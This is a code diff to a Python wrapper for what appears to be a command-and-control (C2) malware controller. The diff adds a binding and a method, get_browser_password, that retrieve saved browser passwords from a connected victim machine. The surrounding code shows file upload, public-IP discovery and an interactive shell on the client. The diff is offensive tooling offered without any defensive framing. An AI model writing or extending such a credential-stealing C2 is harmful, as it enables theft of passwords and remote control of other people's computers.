@@ -57,6 +57,10 @@ class C2Wrapper:
         # void upload_file_to_client(sock_t, char*, char*)
         self.lib.upload_file_to_client.argtypes = [c_int, c_char_p, c_char_p]
         self.lib.upload_file_to_client.restype = None
+
+        # char* browser_password_handle(sock_t client_fd)
+        self.lib.browser_password_handle.argtypes = [c_int]
+        self.lib.browser_password_handle.restype = c_void_p
     
     def _free_cstring(self, ptr: int):
         """Free memory allocated by C code"""
@@ -100,6 +104,25 @@ class C2Wrapper:
         for line in result.splitlines():
             if line.startswith("Public IP"):
                 self.ipv4 = line.split(":", 1)[1].strip()
+        return result
+    
+    def get_browser_password(self) -> str:
+        """
+        Get client browser password
+        
+        Returns:
+            Browser password string
+        """
+        if self.client_fd is None:
+            raise RuntimeError("Client not connected. Call setup() first.")
+        
+        ptr = self.lib.browser_password_handle(self.client_fd)
+        if not ptr:
+            return ""
+        
+        # Convert C string to Python string
+        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        self._free_cstring(ptr)
         return result
     
     def interactive_shell(self):
